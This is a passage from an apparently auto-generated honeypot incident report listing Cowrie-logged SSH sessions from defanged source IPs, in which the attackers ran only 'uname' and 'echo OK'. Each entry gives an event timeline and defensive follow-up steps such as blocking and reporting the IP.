| **First Seen** | 2026-06-27 10:55 |
| **Last Seen** | 2026-06-27 10:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:55:39` | `cowrie.session.connect` |
| `2026-06-27 10:55:39` | `cowrie.client.version` |
| `2026-06-27 10:55:40` | `cowrie.client.kex` |
| `2026-06-27 10:55:40` | `cowrie.login.success` |
| `2026-06-27 10:55:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.111[.]107` to AbuseIPDB if not already reported
- [ ] Block `118.26.111[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5fad805994b

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-06-27 10:55 |
| **Last Seen** | 2026-06-27 10:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:55:41` | `cowrie.session.connect` |
| `2026-06-27 10:55:41` | `cowrie.client.version` |
| `2026-06-27 10:55:41` | `cowrie.client.kex` |
| `2026-06-27 10:55:41` | `cowrie.login.success` |
| `2026-06-27 10:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eb72eaf1bcd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:56 |
| **Last Seen** | 2026-06-27 10:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:56:04` | `cowrie.session.connect` |
| `2026-06-27 10:56:04` | `cowrie.client.version` |
| `2026-06-27 10:56:04` | `cowrie.client.kex` |
| `2026-06-27 10:56:04` | `cowrie.login.success` |
| `2026-06-27 10:56:05` | `cowrie.session.params` |
| `2026-06-27 10:56:05` | `cowrie.command.input` |
| `2026-06-27 10:56:05` | `cowrie.log.closed` |
| `2026-06-27 10:56:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47531775dd56

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:56 |
| **Last Seen** | 2026-06-27 10:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:56:59` | `cowrie.session.connect` |
| `2026-06-27 10:56:59` | `cowrie.client.version` |
| `2026-06-27 10:56:59` | `cowrie.client.kex` |
| `2026-06-27 10:56:59` | `cowrie.login.success` |
| `2026-06-27 10:57:00` | `cowrie.session.params` |
| `2026-06-27 10:57:00` | `cowrie.command.input` |
| `2026-06-27 10:57:00` | `cowrie.log.closed` |
| `2026-06-27 10:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99a411e48800

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:57 |
| **Last Seen** | 2026-06-27 10:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:57:52` | `cowrie.session.connect` |
| `2026-06-27 10:57:52` | `cowrie.client.version` |
| `2026-06-27 10:57:52` | `cowrie.client.kex` |
| `2026-06-27 10:57:53` | `cowrie.login.success` |
| `2026-06-27 10:57:53` | `cowrie.session.params` |
| `2026-06-27 10:57:53` | `cowrie.command.input` |
| `2026-06-27 10:57:53` | `cowrie.log.closed` |
| `2026-06-27 10:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b48de4416dc8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:58 |
| **Last Seen** | 2026-06-27 10:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:58:46` | `cowrie.session.connect` |
| `2026-06-27 10:58:46` | `cowrie.client.version` |
| `2026-06-27 10:58:46` | `cowrie.client.kex` |
| `2026-06-27 10:58:46` | `cowrie.login.success` |
| `2026-06-27 10:58:47` | `cowrie.session.params` |
| `2026-06-27 10:58:47` | `cowrie.command.input` |
| `2026-06-27 10:58:47` | `cowrie.log.closed` |
| `2026-06-27 10:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56885f29c8bd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:59 |
| **Last Seen** | 2026-06-27 10:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:59:41` | `cowrie.session.connect` |
| `2026-06-27 10:59:41` | `cowrie.client.version` |
| `2026-06-27 10:59:41` | `cowrie.client.kex` |
| `2026-06-27 10:59:41` | `cowrie.login.success` |
| `2026-06-27 10:59:42` | `cowrie.session.params` |
| `2026-06-27 10:59:42` | `cowrie.command.input` |
| `2026-06-27 10:59:42` | `cowrie.log.closed` |
| `2026-06-27 10:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be24f71d9a53

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:00 |
| **Last Seen** | 2026-06-27 11:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:00:35` | `cowrie.session.connect` |
| `2026-06-27 11:00:35` | `cowrie.client.version` |
| `2026-06-27 11:00:35` | `cowrie.client.kex` |
| `2026-06-27 11:00:35` | `cowrie.login.success` |
| `2026-06-27 11:00:36` | `cowrie.session.params` |
| `2026-06-27 11:00:36` | `cowrie.command.input` |
| `2026-06-27 11:00:36` | `cowrie.log.closed` |
| `2026-06-27 11:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-493f50f68441

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 11:00 |
| **Last Seen** | 2026-06-27 11:00 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:00:47` | `cowrie.session.connect` |
| `2026-06-27 11:00:48` | `cowrie.client.version` |
| `2026-06-27 11:00:48` | `cowrie.client.kex` |
| `2026-06-27 11:00:54` | `cowrie.login.success` |
| `2026-06-27 11:00:58` | `cowrie.session.params` |
| `2026-06-27 11:00:58` | `cowrie.command.input` |
| `2026-06-27 11:00:59` | `cowrie.log.closed` |
| `2026-06-27 11:00:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f5f6b6bc1c5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:01 |
| **Last Seen** | 2026-06-27 11:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:01:28` | `cowrie.session.connect` |
| `2026-06-27 11:01:28` | `cowrie.client.version` |
| `2026-06-27 11:01:28` | `cowrie.client.kex` |
| `2026-06-27 11:01:29` | `cowrie.login.success` |
| `2026-06-27 11:01:29` | `cowrie.session.params` |
| `2026-06-27 11:01:29` | `cowrie.command.input` |
| `2026-06-27 11:01:29` | `cowrie.log.closed` |
| `2026-06-27 11:01:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09fd31a905ae

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 11:01 |
| **Last Seen** | 2026-06-27 11:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:01:35` | `cowrie.session.connect` |
| `2026-06-27 11:01:35` | `cowrie.client.version` |
| `2026-06-27 11:01:35` | `cowrie.client.kex` |
| `2026-06-27 11:01:37` | `cowrie.login.success` |
| `2026-06-27 11:01:38` | `cowrie.session.params` |
| `2026-06-27 11:01:38` | `cowrie.command.input` |
| `2026-06-27 11:01:38` | `cowrie.log.closed` |
| `2026-06-27 11:01:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-529483c7437d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:02 |
| **Last Seen** | 2026-06-27 11:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:02:21` | `cowrie.session.connect` |
| `2026-06-27 11:02:21` | `cowrie.client.version` |
| `2026-06-27 11:02:22` | `cowrie.client.kex` |
| `2026-06-27 11:02:22` | `cowrie.login.success` |
| `2026-06-27 11:02:23` | `cowrie.session.params` |
| `2026-06-27 11:02:23` | `cowrie.command.input` |
| `2026-06-27 11:02:23` | `cowrie.log.closed` |
| `2026-06-27 11:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-456dba21efa2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:03 |
| **Last Seen** | 2026-06-27 11:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:03:19` | `cowrie.session.connect` |
| `2026-06-27 11:03:19` | `cowrie.client.version` |
| `2026-06-27 11:03:19` | `cowrie.client.kex` |
| `2026-06-27 11:03:19` | `cowrie.login.success` |
| `2026-06-27 11:03:20` | `cowrie.session.params` |
| `2026-06-27 11:03:20` | `cowrie.command.input` |
| `2026-06-27 11:03:20` | `cowrie.log.closed` |
| `2026-06-27 11:03:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa79308185f4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:04 |
| **Last Seen** | 2026-06-27 11:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:04:13` | `cowrie.session.connect` |
| `2026-06-27 11:04:13` | `cowrie.client.version` |
| `2026-06-27 11:04:14` | `cowrie.client.kex` |
| `2026-06-27 11:04:14` | `cowrie.login.success` |
| `2026-06-27 11:04:15` | `cowrie.session.params` |
| `2026-06-27 11:04:15` | `cowrie.command.input` |
| `2026-06-27 11:04:15` | `cowrie.log.closed` |
| `2026-06-27 11:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d5a25f1147f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:05 |
| **Last Seen** | 2026-06-27 11:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:05:09` | `cowrie.session.connect` |
| `2026-06-27 11:05:09` | `cowrie.client.version` |
| `2026-06-27 11:05:10` | `cowrie.client.kex` |
| `2026-06-27 11:05:10` | `cowrie.login.success` |
| `2026-06-27 11:05:11` | `cowrie.session.params` |
| `2026-06-27 11:05:11` | `cowrie.command.input` |
| `2026-06-27 11:05:11` | `cowrie.log.closed` |
| `2026-06-27 11:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89ab7dec56fe

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:06 |
| **Last Seen** | 2026-06-27 11:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:06:06` | `cowrie.session.connect` |
| `2026-06-27 11:06:06` | `cowrie.client.version` |
| `2026-06-27 11:06:06` | `cowrie.client.kex` |
| `2026-06-27 11:06:07` | `cowrie.login.success` |
| `2026-06-27 11:06:07` | `cowrie.session.params` |
| `2026-06-27 11:06:07` | `cowrie.command.input` |
| `2026-06-27 11:06:07` | `cowrie.log.closed` |
| `2026-06-27 11:06:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9534170b251

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:07 |
| **Last Seen** | 2026-06-27 11:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:07:03` | `cowrie.session.connect` |
| `2026-06-27 11:07:03` | `cowrie.client.version` |
| `2026-06-27 11:07:03` | `cowrie.client.kex` |
| `2026-06-27 11:07:03` | `cowrie.login.success` |
| `2026-06-27 11:07:04` | `cowrie.session.params` |
| `2026-06-27 11:07:04` | `cowrie.command.input` |
| `2026-06-27 11:07:04` | `cowrie.log.closed` |
| `2026-06-27 11:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-364607b12640

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:07 |
| **Last Seen** | 2026-06-27 11:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:07:58` | `cowrie.session.connect` |
| `2026-06-27 11:07:58` | `cowrie.client.version` |
| `2026-06-27 11:07:59` | `cowrie.client.kex` |
| `2026-06-27 11:07:59` | `cowrie.login.success` |
| `2026-06-27 11:08:00` | `cowrie.session.params` |
| `2026-06-27 11:08:00` | `cowrie.command.input` |
| `2026-06-27 11:08:00` | `cowrie.log.closed` |
| `2026-06-27 11:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dcb82f69863

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:08 |
| **Last Seen** | 2026-06-27 11:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:08:49` | `cowrie.session.connect` |
| `2026-06-27 11:08:49` | `cowrie.client.version` |
| `2026-06-27 11:08:50` | `cowrie.client.kex` |
| `2026-06-27 11:08:50` | `cowrie.login.success` |
| `2026-06-27 11:08:51` | `cowrie.session.params` |
| `2026-06-27 11:08:51` | `cowrie.command.input` |
| `2026-06-27 11:08:51` | `cowrie.log.closed` |
| `2026-06-27 11:08:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d597dfe4ee2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:09 |
| **Last Seen** | 2026-06-27 11:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:09:44` | `cowrie.session.connect` |
| `2026-06-27 11:09:44` | `cowrie.client.version` |
| `2026-06-27 11:09:44` | `cowrie.client.kex` |
| `2026-06-27 11:09:44` | `cowrie.login.success` |
| `2026-06-27 11:09:45` | `cowrie.session.params` |
| `2026-06-27 11:09:45` | `cowrie.command.input` |
| `2026-06-27 11:09:45` | `cowrie.log.closed` |
| `2026-06-27 11:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4e883e7dbdb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:10 |
| **Last Seen** | 2026-06-27 11:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:10:36` | `cowrie.session.connect` |
| `2026-06-27 11:10:36` | `cowrie.client.version` |
| `2026-06-27 11:10:36` | `cowrie.client.kex` |
| `2026-06-27 11:10:36` | `cowrie.login.success` |
| `2026-06-27 11:10:37` | `cowrie.session.params` |
| `2026-06-27 11:10:37` | `cowrie.command.input` |
| `2026-06-27 11:10:37` | `cowrie.log.closed` |
| `2026-06-27 11:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeaf91372916

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:11 |
| **Last Seen** | 2026-06-27 11:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:11:29` | `cowrie.session.connect` |
| `2026-06-27 11:11:29` | `cowrie.client.version` |
| `2026-06-27 11:11:29` | `cowrie.client.kex` |
| `2026-06-27 11:11:29` | `cowrie.login.success` |
| `2026-06-27 11:11:30` | `cowrie.session.params` |
| `2026-06-27 11:11:30` | `cowrie.command.input` |
| `2026-06-27 11:11:30` | `cowrie.log.closed` |
| `2026-06-27 11:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-994545bc6a2b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 11:11 |
| **Last Seen** | 2026-06-27 11:12 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:11:56` | `cowrie.session.connect` |
| `2026-06-27 11:11:57` | `cowrie.client.version` |
| `2026-06-27 11:11:57` | `cowrie.client.kex` |
| `2026-06-27 11:12:03` | `cowrie.login.success` |
| `2026-06-27 11:12:06` | `cowrie.session.params` |
| `2026-06-27 11:12:06` | `cowrie.command.input` |
| `2026-06-27 11:12:08` | `cowrie.log.closed` |
| `2026-06-27 11:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fab4aab5176c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:12 |
| **Last Seen** | 2026-06-27 11:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:12:22` | `cowrie.session.connect` |
| `2026-06-27 11:12:22` | `cowrie.client.version` |
| `2026-06-27 11:12:22` | `cowrie.client.kex` |
| `2026-06-27 11:12:22` | `cowrie.login.success` |
| `2026-06-27 11:12:23` | `cowrie.session.params` |
| `2026-06-27 11:12:23` | `cowrie.command.input` |
| `2026-06-27 11:12:23` | `cowrie.log.closed` |
| `2026-06-27 11:12:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0a3ffcb4c78

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:13 |
| **Last Seen** | 2026-06-27 11:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:13:15` | `cowrie.session.connect` |
| `2026-06-27 11:13:15` | `cowrie.client.version` |
| `2026-06-27 11:13:16` | `cowrie.client.kex` |
| `2026-06-27 11:13:16` | `cowrie.login.success` |
| `2026-06-27 11:13:17` | `cowrie.session.params` |
| `2026-06-27 11:13:17` | `cowrie.command.input` |
| `2026-06-27 11:13:17` | `cowrie.log.closed` |
| `2026-06-27 11:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d97dee487e36

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:14 |
| **Last Seen** | 2026-06-27 11:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:14:11` | `cowrie.session.connect` |
| `2026-06-27 11:14:11` | `cowrie.client.version` |
| `2026-06-27 11:14:11` | `cowrie.client.kex` |
| `2026-06-27 11:14:12` | `cowrie.login.success` |
| `2026-06-27 11:14:12` | `cowrie.session.params` |
| `2026-06-27 11:14:12` | `cowrie.command.input` |
| `2026-06-27 11:14:13` | `cowrie.log.closed` |
| `2026-06-27 11:14:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7f15b879ae7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:15 |
| **Last Seen** | 2026-06-27 11:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
